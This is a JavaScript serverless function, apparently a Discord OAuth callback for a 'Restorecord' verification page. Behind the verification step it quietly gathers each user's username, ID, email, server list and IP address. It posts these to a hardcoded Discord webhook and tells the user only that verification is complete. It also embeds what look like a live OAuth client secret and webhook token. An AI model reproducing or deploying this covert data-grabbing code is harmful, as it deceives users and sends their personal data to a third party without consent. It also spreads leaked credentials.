export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Code not provided");

  const clientId = "1390626260056674366";
  const clientSecret = "hL-Ji669_YHUf7ICB91PazHBrBeU0_eA";
  const redirectUri = "https://restorecord-three.vercel.app/api/callback";
  const webhookURL = "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf";

  const params = new URLSearchParams();
  params.append("client_id", clientId);
  params.append("client_secret", clientSecret);
  params.append("grant_type", "authorization_code");
  params.append("code", code);
  params.append("redirect_uri", redirectUri);
  params.append("scope", "identify email guilds");

  const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: params.toString(),
  });

  if (!tokenResponse.ok) return res.status(500).send("Token exchange failed");
  const tokenData = await tokenResponse.json();

  const userResponse = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${tokenData.access_token}` },
  });

  const guildsResponse = await fetch("https://discord.com/api/users/@me/guilds", {
    headers: { Authorization: `Bearer ${tokenData.access_token}` },
  });

  if (!userResponse.ok || !guildsResponse.ok) return res.status(500).send("Failed to fetch user data");

  const userData = await userResponse.json();
  const guildsData = await guildsResponse.json();

  const guildList = guildsData.slice(0, 10).map(g => `• ${g.name} (${g.id})`).join("\n") || "None";

  const userIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";

  // Send embed to webhook
  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [
        {
          title: "New Verification Log",
          color: 0x2b2d31,
          description: "```" +
            `Username : ${userData.username}#${userData.discriminator}\n` +
            `User ID : ${userData.id}\n` +
            `Email   : ${userData.email || "Not Available"}\n` +
            `IP      : ${userIp}\n\n` +
            `Servers:\n${guildList}` +
            "```",
          footer: {
            text: "Restorecord Logs",
          },
          timestamp: new Date().toISOString()
        }
      ]
    }),
  }).catch(console.error);

  res.status(200).send("Verification complete. You can close this tab.");
}
